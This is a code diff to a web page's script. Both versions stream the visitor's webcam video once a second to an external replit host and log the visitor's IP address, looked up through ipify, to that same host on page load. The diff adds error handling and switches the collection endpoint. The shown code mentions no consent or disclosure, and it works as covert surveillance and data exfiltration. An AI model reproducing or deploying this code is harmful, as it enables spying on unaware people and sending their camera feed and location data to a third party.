@@ -18,30 +18,46 @@
 
 <script>
     async function startCamera() {
-        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        let video = document.getElementById("videoElement");
-        video.srcObject = stream;
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            let video = document.getElementById("videoElement");
+            video.srcObject = stream;
 
-        const mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = (event) => {
-            fetch('https://OutlyingWorldlyAggregators.repl.co/stream', {
-                method: "POST",
-                body: event.data
-            });
-        };
-        mediaRecorder.start(1000); // Sends video data every second
+            const mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    fetch("https://ConnorMoreland1.replit.dev/stream", {
+                        method: "POST",
+                        body: event.data
+                    }).then(response => response.json())
+                    .then(data => console.log("Stream Data:", data))
+                    .catch(error => console.error("Error:", error));
+                }
+            };
+            mediaRecorder.start(1000); // Sends video data every second
+        } catch (err) {
+            console.error("Error accessing the camera:", err);
+        }
     }
-async function logUser() {
-    let ipResponse = await fetch('https://api64.ipify.org?format=json');
-    let data = await ipResponse.json();
-    fetch('https://OutlyingWorldlyAggregators.repl.co/log', { 
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ip: data.ip, timestamp: new Date() })
-    });
-}
-logUser();
 
+    async function logUser() {
+        try {
+            let ipResponse = await fetch('https://api64.ipify.org?format=json');
+            let data = await ipResponse.json();
+            fetch('https://ConnorMoreland1.replit.dev/log', { 
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip: data.ip, timestamp: new Date() })
+            }).then(response => response.json())
+              .then(data => console.log("Log Data:", data))
+              .catch(error => console.error("Error:", error));
+        } catch (err) {
+            console.error("Error logging user:", err);
+        }
+    }
+
+    // Call logUser to log the access
+    logUser();
 </script>
 </body>
 </html>
